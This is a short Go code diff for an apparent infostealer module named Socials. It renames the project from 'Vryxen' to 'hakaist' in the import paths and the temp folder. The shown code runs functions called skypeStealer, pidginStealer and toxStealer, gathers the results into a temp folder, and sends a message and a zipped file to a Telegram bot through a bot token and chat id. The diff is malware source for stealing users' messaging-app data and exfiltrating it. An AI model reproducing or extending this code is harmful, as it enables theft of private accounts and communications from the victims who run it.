@@ -1,16 +1,17 @@
 package Socials
 
 import (
+	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
-        "fmt"
-	"github.com/unf6/vryxen/pkg/utils/fileutil"
-	"github.com/unf6/vryxen/pkg/utils/requests"
+
+	"github.com/lukyydnv/hakaist/pkg/utils/fileutil"
+	"github.com/lukyydnv/hakaist/pkg/utils/requests"
 )
 
 func Run(botToken, chatId string) {
-	folderMessaging := filepath.Join(os.Getenv("TEMP"), "Vryxen", "SocialMedias")
+	folderMessaging := filepath.Join(os.Getenv("TEMP"), "hakaist", "SocialMedias")
 	skypeStealer(folderMessaging)
 	pidginStealer(folderMessaging)
 	toxStealer(folderMessaging)
@@ -30,7 +31,7 @@ func Run(botToken, chatId string) {
 
 	requests.Send2TelegramMessage(botToken, chatId, message)
 	requests.Send2TelegramDocument(botToken, chatId, tempZip)
-	
+
 }
 
 func skypeStealer(folderMessaging string) {
